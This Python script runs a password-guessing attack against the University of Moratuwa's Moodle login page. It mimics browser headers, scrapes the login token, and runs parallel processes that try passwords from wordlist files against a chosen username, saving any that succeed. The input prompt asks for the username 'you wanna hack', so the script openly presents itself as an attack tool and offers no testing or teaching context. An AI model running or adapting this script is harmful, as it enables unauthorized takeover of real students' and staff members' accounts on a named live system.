import requests
import multiprocessing
from bs4 import BeautifulSoup


# Target URL for login
url = 'https://online.uom.lk/login/index.php'


# Headers for GET request to fetch initial login page
getHeaders = {
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Sec-Ch-Ua": 'Not/A)Brand";v="8", "Chromium";v="126"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "Windows",
    "Accept-Language": "en-US",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=0, i",
    "Connection": "keep-alive",
}


# Headers for POST request to submit login credentials
postHeaders = {
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "Windows",
    "Accept-Language": "en-US",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "https://online.uom.lk",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://online.uom.lk/login/index.php",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=0, i",
    "Connection": "keep-alive"
}


# Function to perform GET request to fetch initial login page
def get_request():
    global cookie, token

    response = requests.get(url, headers=getHeaders, cookies=cookie)

    # Update cookies from response
    if 'Set-Cookie' in response.headers:
        moodleCookie = response.headers['Set-Cookie'].split(';')[0].split("=")
        cookie = {moodleCookie[0]: moodleCookie[1]}

    # Parse login token from response content
    if response.status_code == 200:
        soup = BeautifulSoup(response.content, 'html.parser')
        try:
            loginTokenValue = soup.find('input', {'name': 'logintoken'})['value']
            token = loginTokenValue
        except:
            raise ValueError("Token Not Found")
    else:
        raise ValueError(f"Failed to retrieve login page. Status code: {response.status_code}")


# Function to perform POST request with login credentials
def post_request(userName, password, validLogins):
    global token
    
    loginData = {
        'logintoken': token,
        'username': userName,
        'password': password
    }

    response = requests.post(url, headers=postHeaders, cookies=cookie, data=loginData)
    
    # Check if login was successful based on response headers
    if 'Set-Cookie' in response.headers:
        print("\nLogin Found...")
        validLogins[userName]=password
        print("\n{",userName,":",password,"}")
    else:
        # If login failed, update token from response content
        soup = BeautifulSoup(response.content, 'html.parser')
        try:
            loginTokenValue = soup.find('input', {'name': 'logintoken'})['value']
            token = loginTokenValue
        except:
            raise ValueError("Token Not Found")
    return


# Main function to initiate login process
def worker(userName, passwordFile, validLogins):
    global cookie

    userName = userName
    cookie = {}

    get_request()

    # Iterate through passwords in the provided file
    with open(passwordFile, 'r') as file:
        for idx, line in enumerate(file, start=1):
            if(not len(validLogins)):
                password = line.strip()
                print("{0} Checking {1} : {2}".format(idx, userName, password))
                post_request(userName, password,validLogins)
            else:
                break


# Your existing functions and imports...

if __name__ == '__main__':
    
    userName = input("Enter UoM UserName you wanna hack: ")
    print("Keep the file you wanna check in the CWD with names like '1.txt' , '2.txt' , ....")
    
    numOfFiles = int(input("\nEnter the max number of '#'.txt files you wanna test as batch: "))
    filenames=[f"{i}.txt" for i in range(1,numOfFiles+1)]
    
    manager = multiprocessing.Manager()
    validLogins = manager.dict()
    processes = []

    # Create and start a separate process for each password file
    for passwordFile in filenames:
        p = multiprocessing.Process(target=worker, args=(userName, passwordFile, validLogins))
        processes.append(p)
        p.start()

    # Wait for all processes to complete
    for p in processes:
        p.join()

    if (not validLogins):print("No Passwords match.")